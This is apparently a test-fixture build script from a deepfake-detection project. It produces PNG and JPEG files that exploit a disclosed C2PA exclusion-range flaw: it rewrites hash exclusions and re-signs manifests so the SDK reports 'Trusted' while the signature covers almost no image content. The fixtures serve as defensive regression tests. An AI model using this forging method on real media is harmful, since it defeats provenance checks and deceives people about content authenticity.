#!/usr/bin/env python3
"""Build the C2PA hard-binding exclusion attack fixtures (P0R-20).

The 2026-10-02 disclosure (c2pa-rs <= 0.91.3): a ``c2pa.hash.data`` assertion
may list exclusion byte-ranges that cover the whole file (or everything except
the manifest store), so an emptied asset still gets a valid signature and the
SDK reports it Valid/Trusted. The c2pa-python Builder computes the exclusions
itself and offers no way to write bad ones, so these fixtures are built by:

1. signing a normal PNG / JPEG with a throw-away test CA (openssl + the SDK);
2. rewriting the active manifest's ``c2pa.hash.data`` assertion in place —
   new exclusions (whole-file, or past the store into content), the data hash
   recomputed over the surviving bytes, and the assertion's ``pad`` resized so
   the manifest store keeps the exact same byte length (no box offset shifts);
3. updating the claim's hashed-URI for that assertion (fixed 32-byte field);
4. re-signing the COSE_Sign1 over the patched claim with the test signer key
   (ES256), overwriting the 64-byte signature in place;
5. fixing the PNG ``caBX`` CRC.

The result is a file the c2pa SDK itself reports Trusted (when the test CA is
trusted via DEEPFAKE_LENS_C2PA_TRUST_ANCHORS) yet whose signature covers no
(or almost no) asset content — exactly what P0R-20's check must refuse.

Fixtures written to fixtures/c2pa-2.4/:
- exclusion-twozone.png    — the exact store exclusion plus a second range of 2000 content bytes (SDK: Trusted);
- exclusion-allcontent.png — the exact store exclusion plus ranges over every other byte (SDK: Trusted);
- exclusion-twozone.jpg    — the JPEG two-range form (SDK: Trusted);
- exclusion-wholefile.png  — one exclusion over the whole file (SDK: Invalid, dataHash.mismatch);
- exclusion-paststore.png  — one exclusion over the store and content after it (SDK: Invalid);
- exclusion-attack-ca-cert.pem — the throw-away CA the files chain to.

Usage:  python scripts/build_c2pa_exclusion_fixtures.py [--force]
"""

from __future__ import annotations

import hashlib
import shutil
import struct
import subprocess
import sys
import tempfile
import zlib
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
FIXTURE_DIR = REPO_ROOT / "fixtures" / "c2pa-2.4"
ATTACK_CA = "exclusion-attack-ca-cert.pem"
IPTC_AI = "http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia"
PAST_STORE_EXTRA = 2000  # bytes of real content the past-store exclusion also drops


# --- minimal CBOR (encode + offset-tracking decode) ------------------------

def _enc_head(mt: int, n: int) -> bytes:
    if n < 24:
        return bytes([mt << 5 | n])
    if n < 0x100:
        return bytes([mt << 5 | 24, n])
    if n < 0x10000:
        return bytes([mt << 5 | 25]) + struct.pack(">H", n)
    if n < 0x100000000:
        return bytes([mt << 5 | 26]) + struct.pack(">I", n)
    return bytes([mt << 5 | 27]) + struct.pack(">Q", n)


def cbor_encode(obj: object) -> bytes:
    if isinstance(obj, bool):
        return bytes([0xF5 if obj else 0xF4])
    if obj is None:
        return b"\xf6"
    if isinstance(obj, int):
        return _enc_head(0, obj) if obj >= 0 else _enc_head(1, -1 - obj)
    if isinstance(obj, (bytes, bytearray)):
        return _enc_head(2, len(obj)) + bytes(obj)
    if isinstance(obj, str):
        b = obj.encode("utf-8")
        return _enc_head(3, len(b)) + b
    if isinstance(obj, list):
        return _enc_head(4, len(obj)) + b"".join(cbor_encode(v) for v in obj)
    if isinstance(obj, dict):
        return _enc_head(5, len(obj)) + b"".join(cbor_encode(k) + cbor_encode(v) for k, v in obj.items())
    raise TypeError(f"cannot encode {type(obj)}")


def _dec(buf: bytes, p: int) -> tuple[object, int]:
    ib = buf[p]
    mt, ai = ib >> 5, ib & 31
    p += 1
    if ai < 24:
        val = ai
    elif ai == 24:
        val = buf[p]; p += 1
    elif ai == 25:
        val, = struct.unpack(">H", buf[p:p + 2]); p += 2
    elif ai == 26:
        val, = struct.unpack(">I", buf[p:p + 4]); p += 4
    elif ai == 27:
        val, = struct.unpack(">Q", buf[p:p + 8]); p += 8
    else:
        raise ValueError(f"bad additional info {ai}")
    if mt == 0:
        return val, p
    if mt == 1:
        return -1 - val, p
    if mt == 2:
        return bytes(buf[p:p + val]), p + val
    if mt == 3:
        return buf[p:p + val].decode("utf-8"), p + val
    if mt == 4:
        out = []
        for _ in range(val):
            v, p = _dec(buf, p); out.append(v)
        return out, p
    if mt == 5:
        d: dict[object, object] = {}
        for _ in range(val):
            k, p = _dec(buf, p); v, p = _dec(buf, p); d[k] = v
        return d, p
    if mt == 7:
        return {20: False, 21: True, 22: None, 23: None}.get(val, val), p
    raise ValueError(f"unsupported major type {mt}")


# --- JUMBF walk ------------------------------------------------------------

class Box:
    __slots__ = ("type", "bstart", "bend", "cstart", "cend", "label", "children")

    def __init__(self, t: bytes, bstart: int, bend: int, cstart: int, cend: int) -> None:
        self.type = t
        self.bstart, self.bend, self.cstart, self.cend = bstart, bend, cstart, cend
        self.label = ""
        self.children: list[Box] = []


def _walk(buf: bytes, start: int, end: int) -> list[Box]:
    boxes: list[Box] = []
    p = start
    while p + 8 <= end:
        length, = struct.unpack(">I", buf[p:p + 4])
        typ = buf[p + 4:p + 8]
        hl = 8
        if length == 1:
            length, = struct.unpack(">Q", buf[p + 8:p + 16])
            hl = 16
        bend = p + length
        if bend > end or length < hl:
            break
        box = Box(typ, p, bend, p + hl, bend)
        if typ == b"jumb":
            box.children = _walk(buf, box.cstart, box.cend)
            for child in box.children:
                if child.type == b"jumd":
                    payload = buf[child.cstart:child.cend]
                    box.label = payload[17:].split(b"\x00", 1)[0].decode("ascii", "replace")
                    break
        boxes.append(box)
        p = bend
    return boxes


def _find(boxes: list[Box], label: str) -> Box | None:
    for box in boxes:
        if box.label == label:
            return box
        hit = _find(box.children, label)
        if hit is not None:
            return hit
    return None


def _cbor_child(box: Box) -> Box:
    for child in box.children:
        if child.type == b"cbor":
            return child
    raise ValueError(f"no cbor box in {box.label}")


# --- openssl test CA -------------------------------------------------------

def _openssl(args: list[str], wd: Path) -> None:
    result = subprocess.run(["openssl", *args], capture_output=True, text=True, cwd=wd, check=False)
    if result.returncode != 0:
        raise RuntimeError(f"openssl {' '.join(args[:2])} failed: {result.stderr.strip()}")


def _make_ca_and_signer(wd: Path) -> tuple[bytes, bytes, bytes]:
    """(chain PEM, PKCS#8 key PEM, CA cert PEM) of a throw-away ES256 test CA + leaf."""
    _openssl(["ecparam", "-name", "prime256v1", "-genkey", "-noout", "-out", "ca-key.pem"], wd)
    _openssl(["req", "-new", "-x509", "-key", "ca-key.pem", "-subj", "/CN=DeepfakeLensC2paExclusionTestCA",
              "-days", "3650", "-out", "ca.pem", "-addext", "basicConstraints=critical,CA:TRUE",
              "-addext", "keyUsage=critical,keyCertSign,cRLSign"], wd)
    _openssl(["ecparam", "-name", "prime256v1", "-genkey", "-noout", "-out", "leaf-sec1.pem"], wd)
    _openssl(["pkcs8", "-topk8", "-nocrypt", "-in", "leaf-sec1.pem", "-out", "leaf-key.pem"], wd)
    _openssl(["req", "-new", "-key", "leaf-key.pem", "-subj", "/CN=DeepfakeLensC2paExclusionSigner", "-out", "leaf.csr"], wd)
    (wd / "leaf.ext").write_text("keyUsage=critical,digitalSignature\nextendedKeyUsage=emailProtection\n", encoding="utf-8")
    _openssl(["x509", "-req", "-in", "leaf.csr", "-CA", "ca.pem", "-CAkey", "ca-key.pem", "-CAcreateserial",
              "-days", "3650", "-out", "leaf-cert.pem", "-extfile", "leaf.ext"], wd)
    chain = (wd / "leaf-cert.pem").read_bytes() + (wd / "ca.pem").read_bytes()
    return chain, (wd / "leaf-key.pem").read_bytes(), (wd / "ca.pem").read_bytes()


def _make_png(path: Path, size: int = 64) -> None:
    def chunk(kind: bytes, payload: bytes) -> bytes:
        return struct.pack(">I", len(payload)) + kind + payload + struct.pack(">I", zlib.crc32(kind + payload) & 0xFFFFFFFF)

    rows = b"".join(
        b"\x00" + b"".join(bytes(((x * 7) % 256, (y * 5) % 256, ((x ^ y) * 3) % 256)) for x in range(size))
        for y in range(size)
    )
    ihdr = struct.pack(">IIBBBBB", size, size, 8, 2, 0, 0, 0)
    path.write_bytes(b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", zlib.compress(rows, 9)) + chunk(b"IEND", b""))


def _make_jpeg(path: Path) -> None:
    from PIL import Image

    Image.new("RGB", (64, 64), (90, 160, 210)).save(path, "JPEG", quality=92)


# --- store location (self-contained; mirrors deepfake_lens.c2pa_binding) ----

def _png_store(data: bytes) -> tuple[int, int]:
    """(container start, end) of the caBX chunk — length+type+data+CRC."""
    off = 8
    while off + 8 <= len(data):
        length, = struct.unpack(">I", data[off:off + 4])
        if data[off + 4:off + 8] == b"caBX":
            return off, off + 12 + length
        off += 12 + length
    raise ValueError("no caBX chunk")


def _jpeg_store(data: bytes) -> tuple[int, int]:
    """(container start, end) of the APP11 segment carrying the JUMBF store."""
    off = 2
    while off + 4 <= len(data):
        if data[off] != 0xFF:
            break
        marker = data[off + 1]
        if marker in (0xD8, 0xD9):
            off += 2
            continue
        if marker == 0xDA:
            break
        length, = struct.unpack(">H", data[off + 2:off + 4])
        if marker == 0xEB:
            return off, off + 2 + length
        off += 2 + length
    raise ValueError("no APP11 segment")


def _container_and_jumbf(data: bytes, container: str) -> tuple[tuple[int, int], tuple[int, int]]:
    """((container start, end), (inner JUMBF start, end)) — the walk uses the inner JUMBF.

    PNG: container = caBX chunk; JUMBF = chunk data (after the 8-byte header,
    before the 4-byte CRC). JPEG: container = APP11 segment; JUMBF begins after
    the marker(2)+length(2)+CI "JP"(2)+En(2)+Z(4) = 12 bytes.
    """
    if container == "png":
        cs, ce = _png_store(data)
        return (cs, ce), (cs + 8, ce - 4)
    cs, ce = _jpeg_store(data)
    return (cs, ce), (cs + 12, ce)


# --- the patch -------------------------------------------------------------

def _data_hash(data: bytes, exclusions: list[tuple[int, int]]) -> bytes:
    """sha256 of the file with every [start, start+length) range removed (C2PA data hash)."""
    kept = bytearray()
    cut = sorted(exclusions)
    pos = 0
    for start, length in cut:
        if start > pos:
            kept += data[pos:start]
        pos = max(pos, start + length)
    kept += data[pos:]
    return hashlib.sha256(bytes(kept)).digest()


# grow mode: the re-encoded assertion is padded to the original length plus this many bytes, so a list with more
# exclusions than the SDK wrote still fits and the draft and the final encoding have the same length.
GROW_BYTES = 128


def _reencode_hash_data(original_cbor: bytes, exclusions: list[tuple[int, int]], new_hash: bytes, *, grow: bool = False) -> bytes:
    """Re-encode a c2pa.hash.data map with new exclusions/hash, padded to the original byte length (+GROW_BYTES)."""
    decoded, _ = _dec(original_cbor, 0)
    assert isinstance(decoded, dict)
    base = {
        "exclusions": [{"start": s, "length": ln} for s, ln in exclusions],
        "name": decoded.get("name", "jumbf manifest"),
        "alg": decoded.get("alg", "sha256"),
        "hash": new_hash,
    }
    target = len(original_cbor) + (GROW_BYTES if grow else 0)
    without_pad = cbor_encode({**base})
    # account for the "pad" key + bstr header, then fill to the exact target length.
    overhead = len(cbor_encode("pad")) + len(_enc_head(2, 0))
    pad_len = max(0, target - len(without_pad) - overhead)
    for _ in range(8):  # converges in one or two steps as the bstr header size settles
        out = cbor_encode({**base, "pad": b"\x00" * pad_len})
        if len(out) == target:
            return out
        pad_len += target - len(out)
        if pad_len < 0:
            break
    raise ValueError("cannot pad hash.data assertion to original length")


def _sign_es256(key_pem: bytes, tbs: bytes) -> bytes:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

    key = serialization.load_pem_private_key(key_pem, password=None)
    der = key.sign(tbs, ec.ECDSA(hashes.SHA256()))
    r, s = decode_dss_signature(der)
    return r.to_bytes(32, "big") + s.to_bytes(32, "big")


def _serialize(box: Box, buf: bytes, sub: dict[int, bytes]) -> bytes:
    """Re-serialize a box, substituting the content of any box whose cstart is in ``sub``.

    Box lengths are recomputed so the tree stays well-formed after a child grows
    or shrinks. Only 8-byte box headers are produced (true for these small boxes).
    """
    if box.cstart in sub:
        content = sub[box.cstart]
    elif box.children:
        content = b"".join(_serialize(child, buf, sub) for child in box.children)
    else:
        content = buf[box.cstart:box.cend]
    if box.cstart - box.bstart != 8:
        raise ValueError("unexpected 16-byte box header")
    return struct.pack(">I", 8 + len(content)) + box.type + content


def _assemble(data: bytes, container: str, new_jumbf: bytes) -> bytes:
    """Splice a rebuilt JUMBF store back into the container and reassemble the file."""
    if container == "png":
        cs, ce = _png_store(data)
        chunk = struct.pack(">I", len(new_jumbf)) + b"caBX" + new_jumbf
        chunk += struct.pack(">I", zlib.crc32(chunk[4:]) & 0xFFFFFFFF)
        return data[:cs] + chunk + data[ce:]
    cs, ce = _jpeg_store(data)
    prefix = data[cs + 2:cs + 12]  # length(2 placeholder) + "JP" + En + Z — keep CI/box-instance/packet
    body = prefix[2:] + new_jumbf  # drop the old length, keep "JP"+En+Z framing
    seg = b"\xff\xeb" + struct.pack(">H", len(body) + 2) + body
    return data[:cs] + seg + data[ce:]


def _patch(data: bytes, container: str, key_pem: bytes, *, mode: str) -> bytes:
    (store_start, store_end), (jumbf_start, jumbf_end) = _container_and_jumbf(data, container)
    boxes = _walk(data, jumbf_start, jumbf_end)
    outer = boxes[0]  # the top-level c2pa jumb super box
    hashdata = _find(boxes, "c2pa.hash.data")
    if not (hashdata and _find(boxes, "c2pa.claim.v2") or _find(boxes, "c2pa.claim")) or not _find(boxes, "c2pa.signature"):
        raise ValueError("missing hash.data / claim / signature box")
    hd_cbor = _cbor_child(hashdata)
    original_cbor = bytes(data[hd_cbor.cstart:hd_cbor.cend])

    store_len = store_end - store_start
    if mode == "wholefile":
        exclusions = [(0, 0)]  # placeholder, fixed up after assembly (covers whole final file)
    elif mode == "paststore":
        exclusions = [(store_start, store_len + PAST_STORE_EXTRA)]
    elif mode == "twozone":
        # Keep the exact manifest-store exclusion (so c2pa-rs's "exclusion matches
        # the manifest location" check passes) AND add a SECOND range that drops
        # real asset content from the signed hash — the disclosed attack shape.
        exclusions = [(store_start, store_len), (store_end, PAST_STORE_EXTRA)]
    elif mode == "allcontent":
        # The exact store exclusion plus ranges covering every other byte: the signature covers nothing.
        exclusions = [(0, store_start), (store_start, store_len), (store_end, len(data) - store_end)]
    else:
        raise ValueError(mode)

    # 1) rebuild the store with the new hash.data cbor (zero hash for now),
    #    growing the JUMBF boxes as needed, and reassemble the whole file.
    draft_cbor = _reencode_hash_data(original_cbor, exclusions, b"\x00" * 32, grow=True)
    new_jumbf = _serialize(outer, data, {hd_cbor.cstart: draft_cbor})
    buf = bytearray(_assemble(data, container, new_jumbf))

    # 2) locate everything in the reassembled file (offsets have moved).
    (cs2, ce2), (js2, je2) = _container_and_jumbf(bytes(buf), container)
    boxes2 = _walk(bytes(buf), js2, je2)
    hashdata = _find(boxes2, "c2pa.hash.data")
    claim = _find(boxes2, "c2pa.claim.v2") or _find(boxes2, "c2pa.claim")
    sig = _find(boxes2, "c2pa.signature")
    assert hashdata and claim and sig
    hd_cbor = _cbor_child(hashdata)

    # 3) final exclusions and data hash against the reassembled file.
    store_len2 = ce2 - cs2
    if mode == "wholefile":
        exclusions = [(0, len(buf))]
    elif mode == "paststore":
        exclusions = [(cs2, store_len2 + PAST_STORE_EXTRA)]
    elif mode == "allcontent":
        exclusions = [(0, cs2), (cs2, store_len2), (ce2, len(buf) - ce2)]
    else:
        exclusions = [(cs2, store_len2), (ce2, PAST_STORE_EXTRA)]
    new_data_hash = _data_hash(bytes(buf), exclusions)
    final_cbor = _reencode_hash_data(original_cbor, exclusions, new_data_hash, grow=True)
    assert len(final_cbor) == hd_cbor.cend - hd_cbor.cstart, "hash.data cbor length changed after fix-up"
    buf[hd_cbor.cstart:hd_cbor.cend] = final_cbor

    # 4) assertion hash = sha256(hash.data jumb box content).
    assertion_hash = hashlib.sha256(bytes(buf[hashdata.cstart:hashdata.bend])).digest()

    # 5) overwrite the claim's hashed-URI for c2pa.hash.data (fixed 32-byte field).
    claim_region = bytes(buf[claim.cstart:claim.cend])
    url_idx = claim_region.find(b"c2pa.assertions/c2pa.hash.data")
    h_idx = claim_region.find(b"\x58\x20", url_idx) if url_idx >= 0 else -1
    if h_idx < 0:
        raise ValueError("hash.data hashed-URI not found in claim")
    abs_h = claim.cstart + h_idx + 2
    buf[abs_h:abs_h + 32] = assertion_hash

    # 6) re-sign the COSE_Sign1 over the patched claim bytes.
    cl_cbor = _cbor_child(claim)
    claim_bytes = bytes(buf[cl_cbor.cstart:cl_cbor.cend])
    sig_cbor = _cbor_child(sig)
    p = sig_cbor.cstart
    assert buf[p] == 0xD2, "signature is not a COSE_Sign1 (tag 18)"
    p += 1
    assert buf[p] >> 5 == 4 and (buf[p] & 31) == 4, "COSE_Sign1 is not a 4-element array"
    p += 1
    protected, p = _dec(bytes(buf), p)
    assert isinstance(protected, bytes)
    _, p = _dec(bytes(buf), p)  # unprotected map
    _, p = _dec(bytes(buf), p)  # payload (nil)
    sig_hdr = p
    assert buf[sig_hdr] == 0x58 and buf[sig_hdr + 1] == 0x40, "unexpected signature encoding"
    tbs = cbor_encode(["Signature1", protected, b"", claim_bytes])
    buf[sig_hdr + 2:sig_hdr + 2 + 64] = _sign_es256(key_pem, tbs)
    return bytes(buf)


def build(target: Path) -> None:
    import c2pa

    ctx = c2pa.Context(c2pa.Settings.from_dict({"builder": {"thumbnail": {"enabled": False}}}))
    manifest = {
        "claim_generator_info": [{"name": "deepfake-lens c2pa exclusion fixture", "version": "1.0"}],
        "title": "Exclusion attack", "format": "image/png",
        "assertions": [{"label": "c2pa.actions.v2", "data": {"actions": [{"action": "c2pa.created", "digitalSourceType": IPTC_AI}]}}],
    }
    with tempfile.TemporaryDirectory() as tmp:
        wd = Path(tmp)
        chain, key, ca_pem = _make_ca_and_signer(wd)
        signer = c2pa.Signer.from_info(c2pa.C2paSignerInfo(alg=b"es256", sign_cert=chain, private_key=key, ta_url=None))
        target.mkdir(parents=True, exist_ok=True)

        # The SDK (c2pa-python 0.38 / c2pa-rs) reports twozone and allcontent Trusted with no failure code —
        # the attack; wholefile and paststore it already reports Invalid (assertion.dataHash.mismatch: no
        # exclusion equals the manifest location) — kept as regressions.
        jobs = [
            ("exclusion-twozone.png", "png", "twozone", "image/png"),
            ("exclusion-allcontent.png", "png", "allcontent", "image/png"),
            ("exclusion-twozone.jpg", "jpeg", "twozone", "image/jpeg"),
            ("exclusion-wholefile.png", "png", "wholefile", "image/png"),
            ("exclusion-paststore.png", "png", "paststore", "image/png"),
        ]
        for name, container, mode, fmt in jobs:
            src = wd / ("src." + ("png" if container == "png" else "jpg"))
            _make_png(src) if container == "png" else _make_jpeg(src)
            signed = wd / ("signed-" + name)
            manifest["format"] = fmt
            c2pa.Builder(__import__("json").dumps(manifest), context=ctx).sign_file(src, signed, signer=signer)
            patched = _patch(signed.read_bytes(), container, key, mode=mode)
            out = target / name
            out.write_bytes(patched)
            print(f"wrote {out} ({len(patched)} bytes, mode={mode})")
        shutil.copyfile(wd / "ca.pem", target / ATTACK_CA)
        print(f"wrote {target / ATTACK_CA}")


def main(argv: list[str] | None = None) -> int:
    if str(REPO_ROOT) not in sys.path:
        sys.path.insert(0, str(REPO_ROOT))
    from deepfake_lens.cli_parser import KoreanArgumentParser

    parser = KoreanArgumentParser(description="C2PA 하드 바인딩 제외범위 공격 픽스처(P0R-20)를 만듭니다.")
    parser.add_argument("--force", action="store_true", help="기존 공격 픽스처를 덮어씀")
    parser.add_argument("--out", type=Path, default=FIXTURE_DIR, help="출력 폴더(기본 fixtures/c2pa-2.4)")
    args = parser.parse_args(argv)
    if (args.out / "exclusion-wholefile.png").exists() and not args.force:
        print(f"error: {args.out} already holds exclusion fixtures; pass --force to regenerate", file=sys.stderr)
        return 2
    if shutil.which("openssl") is None:
        print("error: openssl binary not found on PATH", file=sys.stderr)
        return 2
    try:
        import c2pa  # noqa: F401
    except ImportError:
        print("error: c2pa-python not installed; run pip install 'deepfake-lens[provenance]'", file=sys.stderr)
        return 2
    build(args.out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
